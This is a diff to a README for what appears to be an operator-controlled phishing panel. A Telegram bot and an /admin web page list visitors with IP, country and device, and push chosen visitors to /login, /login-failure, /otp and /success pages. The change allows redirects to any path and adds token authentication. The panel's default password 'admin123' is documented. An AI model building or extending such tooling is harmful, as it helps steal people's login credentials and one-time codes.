@@ -76,15 +76,20 @@ All notifications include language, device, browser, and OS information:
 ### Bot Commands
 The Telegram bot responds to admin commands:
 - **`/visitors`** or **`/list`**: Shows all active visitors with full details (session ID, IP, country, device, current page, last seen)
-- **`/redirect <session> <page>`**: Redirects a visitor to specified page (use first 8 chars of session ID)
-  - Valid pages: `/login`, `/login-failure`, `/otp`, `/success`, `/`
-  - Example: `/redirect a1b2c3d4 /login`
+- **`/redirect <session> <page>`**: Redirects a visitor to ANY page path (use first 8 chars of session ID)
+  - Examples: 
+    - `/redirect a1b2c3d4 /login`
+    - `/redirect a1b2c3d4 /custom-page`
+    - `/redirect a1b2c3d4 /any/path/you/want`
+  - Only requirement: page must start with `/`
 - **`/help`**: Shows all available commands and examples
 
 ### Admin Panel
 Web-based control panel at `/admin`:
-- Password: `admin123`
+- Password: `admin123` (can be changed via `ADMIN_PASSWORD` environment variable)
 - Real-time visitor list (auto-refresh every 3 seconds)
-- One-click redirect buttons for each visitor
+- Quick redirect buttons for common pages (Login, Failure, OTP, Success)
+- Custom page input field to redirect to ANY page path
 - Shows: Session ID, IP, Country, Device, Browser, Current Page, Last Seen
 - Visitor tracking persists across page navigations using session IDs
+- Token-based authentication with 24-hour expiration
